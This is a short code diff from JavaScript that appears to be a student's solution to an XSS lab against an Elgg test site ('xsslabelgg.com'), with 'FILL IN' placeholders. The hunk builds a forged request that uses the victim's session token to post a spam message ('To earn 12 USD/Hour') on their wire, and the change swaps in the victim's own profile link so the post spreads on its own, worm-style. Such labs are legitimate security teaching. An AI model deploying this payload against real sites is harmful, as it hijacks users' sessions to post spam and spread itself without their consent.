@@ -198,7 +198,8 @@ window.onload = function () {
 		
 
 		var sendurl3="http://www.xsslabelgg.com/action/thewire/add"; //FILL IN
-		var content3=token+ts+"&body=To+earn+12+USD%2FHour%28%21%29%2C+visit+now%0D%0Ahttp%3A%2F%2Fwww.xsslabelgg.com%2Fprofile%2Fsamy"; //FILL IN
+		var profileLink =encodeURIComponent(elgg.session.user.url);
+		var content3=token+ts+"&body=To+earn+12+USD%2FHour%28%21%29%2C+visit+now%0D%0A"+profileLink; //FILL IN
 		
 
 		Ajax=new XMLHttpRequest();
